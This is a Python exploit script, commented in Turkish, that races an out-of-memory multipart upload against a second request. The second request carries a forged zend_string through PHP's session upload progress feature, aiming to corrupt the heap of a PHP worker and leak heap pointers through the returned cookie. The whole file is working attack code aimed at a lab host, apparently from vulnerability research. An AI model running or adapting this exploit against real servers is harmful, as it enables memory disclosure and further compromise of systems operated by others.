#!/usr/bin/env python3
"""Concurrent OOM + leak read — corruption window'i yakala.

Kritik bulgu: `zend_mm_heap corrupted` + `Abort (6)` — korupsiyon OLUYOR,
worker crash ediyor (clean recover degil). ~2s corruption window var.

Strateji:
  1. Connection 1: OOM (12MB) — worker'i corrupt et
  2. Connection 2 (CONCURRENT): leak read (forged zend_string) —
     corruption window'inda worker'a isabet et

Delay vary (0, 0.3, 0.6, 1.0, 1.5s) — window'i yakala.

Usage:
  python3 bf_window.py --port 18113 --delays 0,0.3,0.6,1.0,1.5
"""
from __future__ import annotations
import argparse
import struct
import threading
import time

from common import (Target, build_multipart, parse_cookie,
                    count_heap_pointers)


def fire_oom(t: Target, size_mb: int, boundary: bytes) -> int:
    """OOM request (background thread). Returns status."""
    parts = [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "big", "data": b"B" * (size_mb * 1024 * 1024)},
    ]
    body = build_multipart(parts, boundary)
    st, _ = t.post_chunked(body, boundary, read_cap=1 << 20)
    return st


def fire_leak(t: Target, boundary: bytes) -> tuple[int, int, int]:
    """Leak read request. Returns (status, cookie_len, heap_ptr_count)."""
    parts = [
        {"name": "PHPSESSID", "data": b"attacksessionid0001"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    body = build_multipart(parts, boundary)
    st, raw = t.post_chunked(body, boundary, read_cap=1 << 20)
    cookie = parse_cookie(raw)
    base, cnt = count_heap_pointers(cookie, ~0x1FFFFF)
    return st, len(cookie), cnt


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="LAB_IP")
    ap.add_argument("--port", type=int, default=18113)
    ap.add_argument("--delays", default="0,0.3,0.6,1.0,1.5",
                    help="comma-separated delays in seconds")
    ap.add_argument("--size", type=int, default=12, help="OOM field size (MB)")
    args = ap.parse_args()

    delays = [float(d) for d in args.delays.split(",")]
    print(f"{'delay':>6} | {'stOOM':>6} | {'stLeak':>7} | {'cookie':>8} | "
          f"{'cnt':>4} | signal", flush=True)
    print("-" * 62, flush=True)

    for delay in delays:
        t_oom = Target(args.host, args.port, verbose=False)
        t_leak = Target(args.host, args.port, verbose=False)

        result_oom = {}
        def _oom():
            result_oom["st"] = fire_oom(t_oom, args.size, b"S" * 17)

        def _leak():
            time.sleep(delay)
            st, clen, cnt = fire_leak(t_leak, b"BNDRY12345")
            result_oom["leak_st"] = st
            result_oom["leak_clen"] = clen
            result_oom["leak_cnt"] = cnt

        th = threading.Thread(target=_oom)
        tl = threading.Thread(target=_leak)
        th.start()
        tl.start()
        th.join()
        tl.join()

        st_oom = result_oom.get("st", 0)
        st_leak = result_oom.get("leak_st", 0)
        clen = result_oom.get("leak_clen", 0)
        cnt = result_oom.get("leak_cnt", 0)
        signal = "LEAK!" if (clen > 100 and cnt >= 8) else (
            "big" if clen > 100 else "clean")
        print(f"{delay:>6.1f} | {st_oom:>6} | {st_leak:>7} | {clen:>7}B | "
              f"{cnt:>4} | {signal}", flush=True)
        time.sleep(0.5)

    print("-" * 62, flush=True)
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
